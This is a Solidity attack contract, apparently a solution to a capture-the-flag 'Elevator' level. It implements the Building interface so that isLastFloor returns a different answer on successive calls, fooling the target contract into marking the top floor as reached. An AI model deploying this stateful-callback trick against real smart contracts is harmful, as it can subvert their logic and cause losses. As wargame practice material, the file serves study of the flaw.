// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./Elevator.sol";

contract AttackElevator is Building {
  address owner;
  Elevator elevator;
  uint internal counter;

  constructor(address _owner) {
    owner = _owner;
  }

  function gotoFloor(address _elevator, uint _floor) public {
    elevator = Elevator(_elevator);
    elevator.goTo(_floor);
  }

  function isLastFloor(uint _floor) external returns (bool) {
    console.log("attacker isLastFloor: %s", _floor);
    bool res = counter == 0 ? false : true;
    counter++;
    return res;
  }
}
